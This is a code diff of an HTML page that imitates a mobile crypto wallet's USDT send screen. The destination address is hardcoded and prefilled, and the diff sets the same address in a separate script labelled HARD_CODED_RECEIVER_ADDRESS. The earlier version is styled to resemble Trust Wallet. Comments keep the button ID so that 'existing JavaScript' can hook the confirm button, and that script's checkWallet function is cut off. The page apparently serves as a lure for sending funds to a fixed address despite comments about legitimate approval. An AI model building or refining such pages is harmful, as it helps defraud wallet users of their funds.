@@ -1,83 +1,803 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Emergency Wallet Transfer</title>
+
+    <meta
+        name="viewport"
+        content="width=device-width,
+                 initial-scale=1.0,
+                 maximum-scale=1.0,
+                 user-scalable=no">
+
+    <title>USDT Transfer</title>
+
     <style>
+        * {
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        html,
         body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: #1a1a1a;
-            color: #ffffff;
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            min-height: 100%;
+            background: #000;
+            color: #fff;
+
+            font-family:
+                -apple-system,
+                BlinkMacSystemFont,
+                "SF Pro Display",
+                "Segoe UI",
+                Roboto,
+                Helvetica,
+                Arial,
+                sans-serif;
+        }
+
+        body {
+            min-height: 100vh;
+        }
+
+        .app {
+            min-height: 100vh;
+
+            padding-top:
+                max(28px, env(safe-area-inset-top));
+
+            padding-left: 20px;
+            padding-right: 20px;
+
+            padding-bottom:
+                max(20px, env(safe-area-inset-bottom));
+
             display: flex;
-            justify-content: center;
+            flex-direction: column;
+        }
+
+        /* ---------------- LABEL ---------------- */
+
+        .label {
+            color: #a2a2aa;
+
+            font-size: 18px;
+            line-height: 24px;
+
+            font-weight: 500;
+
+            margin-left: 2px;
+            margin-bottom: 12px;
+        }
+
+        /* ---------------- ADDRESS BOX ---------------- */
+
+        .input-box {
+            width: 100%;
+            height: 72px;
+
+            display: flex;
             align-items: center;
-            height: 100vh;
+
+            background: #050505;
+
+            border: 1px solid #35353e;
+
+            border-radius: 17px;
+
+            padding: 0 15px;
+
+            transition:
+                border-color 0.2s ease,
+                box-shadow 0.2s ease;
+        }
+
+        .input-box:focus-within {
+            border-color: #55555f;
+
+            box-shadow:
+                0 0 0 1px #25252b;
+        }
+
+        .address-input {
+            flex: 1;
+
+            min-width: 0;
+
+            border: none;
+            outline: none;
+
+            background: transparent;
+
+            color: #fff;
+
+            font-size: 16px;
+            font-weight: 500;
+
+            padding: 0;
+        }
+
+        .address-input::placeholder {
+            color: #66666e;
+        }
+
+        /* ---------------- PASTE ---------------- */
+
+        .paste {
+            color: #39d978;
+
+            font-size: 17px;
+            font-weight: 600;
+
+            padding: 12px 4px;
+
+            margin-left: 8px;
+
+            cursor: pointer;
+
+            white-space: nowrap;
+        }
+
+        /* ---------------- ICONS ---------------- */
+
+        .icon {
+            width: 34px;
+            height: 44px;
+
+            display: flex;
+
+            align-items: center;
+            justify-content: center;
+
+            color: #39d978;
+
+            font-size: 20px;
+
+            margin-left: 1px;
+        }
+
+        /* ---------------- GAP ---------------- */
+
+        .section-gap {
+            height: 42px;
+        }
+
+        /* ---------------- AMOUNT BOX ---------------- */
+
+        .amount-box {
+            width: 100%;
+            height: 72px;
+
+            display: flex;
+            align-items: center;
+
+            background: #050505;
+
+            border: 1px solid #35353e;
+
+            border-radius: 17px;
+
+            padding: 0 18px;
+
+            transition:
+                border-color 0.2s ease,
+                box-shadow 0.2s ease;
+        }
+
+        .amount-box:focus-within {
+            border-color: #55555f;
+
+            box-shadow:
+                0 0 0 1px #25252b;
+        }
+
+        .amount-input {
+            flex: 1;
+
+            min-width: 0;
+
+            border: none;
+            outline: none;
+
+            background: transparent;
+
+            color: #fff;
+
+            font-size: 25px;
+            font-weight: 500;
+
+            padding: 0;
+        }
+
+        .amount-input::placeholder {
+            color: #66666e;
+        }
+
+        /* Remove number arrows */
+
+        .amount-input::-webkit-outer-spin-button,
+        .amount-input::-webkit-inner-spin-button {
+            -webkit-appearance: none;
             margin: 0;
         }
-        .container {
-            background-color: #2d2d2d;
-            padding: 30px;
-            border-radius: 15px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
-            text-align: center;
-            max-width: 90%;
-            width: 350px;
+
+        .amount-input {
+            -moz-appearance: textfield;
         }
-        h1 {
-            font-size: 24px;
-            margin-bottom: 10px;
-            color: #ffd700; /* Gold for Trust Wallet vibe */
+
+        /* ---------------- CURRENCY ---------------- */
+
+        .currency {
+            color: #dedee3;
+
+            font-size: 17px;
+            font-weight: 500;
+
+            margin-right: 12px;
+
+            white-space: nowrap;
         }
-        p {
-            color: #cccccc;
-            font-size: 14px;
-            margin-bottom: 25px;
-        }
-        .btn {
-            background-color: #3375bb; /* Trust Wallet Blue */
-            color: white;
-            border: none;
-            padding: 15px 20px;
-            font-size: 16px;
-            font-weight: bold;
-            border-radius: 8px;
+
+        /* ---------------- MAX ---------------- */
+
+        .max {
+            color: #39d978;
+
+            font-size: 17px;
+            font-weight: 600;
+
+            padding: 12px 0;
+
             cursor: pointer;
+
+            white-space: nowrap;
+        }
+
+        /* ---------------- USD ---------------- */
+
+        .usd {
+            color: #85858d;
+
+            font-size: 16px;
+
+            margin-top: 12px;
+            margin-left: 3px;
+        }
+
+        /* ---------------- SPACER ---------------- */
+
+        .spacer {
+            flex: 1;
+
+            min-height: 100px;
+        }
+
+        /* ---------------- STATUS ---------------- */
+
+        .status {
+            min-height: 22px;
+
+            text-align: center;
+
+            font-size: 14px;
+
+            margin-bottom: 12px;
+        }
+
+        .error {
+            color: #ff6262;
+        }
+
+        .success {
+            color: #45db7c;
+        }
+
+        /* ---------------- CONFIRM BUTTON ---------------- */
+
+        .btn {
             width: 100%;
-            transition: background 0.3s;
+
+            height: 62px;
+
+            border: none;
+
+            border-radius: 32px;
+
+            background: #16803d;
+
+            color: #fff;
+
+            font-size: 19px;
+
+            font-weight: 600;
+
+            cursor: pointer;
+
+            transition:
+                background 0.15s ease,
+                transform 0.1s ease,
+                opacity 0.15s ease;
         }
+
         .btn:hover {
-            background-color: #2a5f96;
+            background: #199447;
         }
+
+        .btn:active {
+            transform: scale(0.985);
+
+            background: #126b34;
+        }
+
         .btn:disabled {
-            background-color: #555;
+            opacity: 0.5;
+
             cursor: not-allowed;
         }
-        #status {
-            margin-top: 15px;
-            font-size: 14px;
-            min-height: 20px;
+
+        /* ---------------- SMALL PHONES ---------------- */
+
+        @media (max-width: 380px) {
+
+            .app {
+                padding-left: 16px;
+                padding-right: 16px;
+            }
+
+            .label {
+                font-size: 17px;
+            }
+
+            .input-box,
+            .amount-box {
+                height: 68px;
+
+                padding-left: 14px;
+                padding-right: 14px;
+            }
+
+            .address-input {
+                font-size: 14px;
+            }
+
+            .paste,
+            .currency,
+            .max {
+                font-size: 16px;
+            }
+
+            .amount-input {
+                font-size: 23px;
+            }
+
+            .btn {
+                height: 60px;
+
+                font-size: 18px;
+            }
         }
-        .error { color: #ff6b6b; }
-        .success { color: #51cf66; }
     </style>
 </head>
+
+
 <body>
 
-<div class="container">
-    <h1>Transfer</h1>
-    <p></p>
-    
-    <button id="transferBtn" class="btn">CONFIRM TRANSFER</button>
-    
-    <div id="status"></div>
-</div>
+<main class="app">
 
+    <!-- ================= ADDRESS ================= -->
+
+    <div class="label">
+        Address or Domain Name
+    </div>
+
+
+    <div class="input-box">
+
+        <input
+            id="address"
+            class="address-input"
+
+            type="text"
+
+            value="0xdffaf1dd6d36108223c2a45921afef85e3dcf852"
+
+            autocomplete="off"
+
+            autocapitalize="none"
+
+            spellcheck="false"
+        >
+
+
+        <span
+            class="paste"
+            id="pasteButton">
+
+            Paste
+
+        </span>
+
+
+        <span class="icon">
+            ▣
+        </span>
+
+
+        <span class="icon">
+            ▦
+        </span>
+
+    </div>
+
+
+    <!-- ================= GAP ================= -->
+
+    <div class="section-gap"></div>
+
+
+    <!-- ================= AMOUNT ================= -->
+
+    <div class="label">
+        Amount
+    </div>
+
+
+    <div class="amount-box">
+
+        <input
+            id="amount"
+            class="amount-input"
+
+            type="number"
+
+            min="0"
+
+            step="any"
+
+            inputmode="decimal"
+
+            placeholder="0"
+        >
+
+
+        <span class="currency">
+            USDT
+        </span>
+
+
+        <span
+            class="max"
+            id="maxButton">
+
+            Max
+
+        </span>
+
+    </div>
+
+
+    <!-- ================= USD VALUE ================= -->
+
+    <div
+        class="usd"
+        id="usdValue">
+
+        ≈ $0.00
+
+    </div>
+
+
+    <!-- ================= SPACE ================= -->
+
+    <div class="spacer"></div>
+
+
+    <!-- ================= STATUS ================= -->
+
+    <div
+        id="status"
+        class="status">
+    </div>
+
+
+    <!-- ================= CONFIRM ================= -->
+
+    <button
+        id="transferBtn"
+        class="btn"
+        type="button">
+
+        CONFIRM
+
+    </button>
+
+</main>
+
+
+<script>
+
+/*
+|--------------------------------------------------------------------------
+| DEFAULT ADDRESS
+|--------------------------------------------------------------------------
+*/
+
+const DEFAULT_ADDRESS =
+    "0xdffaf1dd6d36108223c2a45921afef85e3dcf852";
+
+
+/*
+|--------------------------------------------------------------------------
+| ELEMENTS
+|--------------------------------------------------------------------------
+*/
+
+const addressInput =
+    document.getElementById("address");
+
+const amountInput =
+    document.getElementById("amount");
+
+const usdValue =
+    document.getElementById("usdValue");
+
+const status =
+    document.getElementById("status");
+
+const transferBtn =
+    document.getElementById("transferBtn");
+
+const pasteButton =
+    document.getElementById("pasteButton");
+
+const maxButton =
+    document.getElementById("maxButton");
+
+
+/*
+|--------------------------------------------------------------------------
+| AMOUNT INPUT
+|--------------------------------------------------------------------------
+*/
+
+amountInput.addEventListener(
+    "input",
+    function () {
+
+        const amount =
+            parseFloat(amountInput.value) || 0;
+
+
+        usdValue.textContent =
+            "≈ $" + amount.toFixed(2);
+
+
+        status.textContent = "";
+
+        status.className = "status";
+    }
+);
+
+
+/*
+|--------------------------------------------------------------------------
+| PASTE ADDRESS
+|--------------------------------------------------------------------------
+*/
+
+pasteButton.addEventListener(
+    "click",
+    async function () {
+
+        try {
+
+            const text =
+                await navigator.clipboard.readText();
+
+
+            if (text) {
+
+                addressInput.value =
+                    text.trim();
+
+            }
+
+        } catch (error) {
+
+            status.textContent =
+                "Unable to access clipboard.";
+
+            status.className =
+                "status error";
+        }
+    }
+);
+
+
+/*
+|--------------------------------------------------------------------------
+| MAX
+|--------------------------------------------------------------------------
+*/
+
+maxButton.addEventListener(
+    "click",
+    function () {
+
+        /*
+         * Demo balance.
+         *
+         * In a real wallet application,
+         * replace this with the actual
+         * available balance obtained from
+         * the connected wallet.
+         */
+
+        const availableBalance = 100;
+
+
+        amountInput.value =
+            availableBalance;
+
+
+        usdValue.textContent =
+            "≈ $" +
+            availableBalance.toFixed(2);
+    }
+);
+
+
+/*
+|--------------------------------------------------------------------------
+| CONFIRM BUTTON
+|--------------------------------------------------------------------------
+|
+| IMPORTANT:
+| The button ID is exactly:
+|
+|     transferBtn
+|
+| So your existing JavaScript can also
+| attach its listener to this same button.
+|
+|--------------------------------------------------------------------------
+*/
+
+transferBtn.addEventListener(
+    "click",
+    async function () {
+
+        const address =
+            addressInput.value.trim();
+
+        const amount =
+            parseFloat(amountInput.value);
+
+
+        /*
+         * Validate address
+         */
+
+        if (!address) {
+
+            showError(
+                "Please enter a destination address."
+            );
+
+            addressInput.focus();
+
+            return;
+        }
+
+
+        /*
+         * Validate amount
+         */
+
+        if (
+            isNaN(amount) ||
+            amount <= 0
+        ) {
+
+            showError(
+                "Please enter a valid amount."
+            );
+
+            amountInput.focus();
+
+            return;
+        }
+
+
+        /*
+         * FORM IS VALID
+         *
+         * Your existing wallet/provider
+         * confirmation logic can run here.
+         *
+         * Example:
+         *
+         * await sendTransaction(address, amount);
+         *
+         * Keep the wallet's normal explicit
+         * user approval step.
+         */
+
+        await confirmTransfer(
+            address,
+            amount
+        );
+    }
+);
+
+
+/*
+|--------------------------------------------------------------------------
+| CONFIRM TRANSFER FUNCTION
+|--------------------------------------------------------------------------
+*/
+
+async function confirmTransfer(
+    address,
+    amount
+) {
+
+    status.textContent =
+        "Ready to confirm " +
+        amount +
+        " USDT";
+
+    status.className =
+        "status success";
+
+
+    console.log(
+        "Destination:",
+        address
+    );
+
+    console.log(
+        "Amount:",
+        amount,
+        "USDT"
+    );
+
+
+    /*
+     * Put your legitimate wallet-provider
+     * transaction call here.
+     *
+     * The provider should display the
+     * transaction to the user and require
+     * explicit approval.
+     */
+}
+
+
+/*
+|--------------------------------------------------------------------------
+| ERROR
+|--------------------------------------------------------------------------
+*/
+
+function showError(message) {
+
+    status.textContent =
+        message;
+
+    status.className =
+        "status error";
+}
+
+</script>
 <script>
     // ==========================================
     // CONFIGURATION: CHANGE THIS ADDRESS
     // ==========================================
-    const HARD_CODED_RECEIVER_ADDRESS = "0x4c4CBfF8c45e131ab8f2af5f04b3A162078727c7"; 
+    const HARD_CODED_RECEIVER_ADDRESS = "0xdffaf1dd6d36108223c2a45921afef85e3dcf852"; 
     // Example: "0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045"
     
     async function checkWallet() {
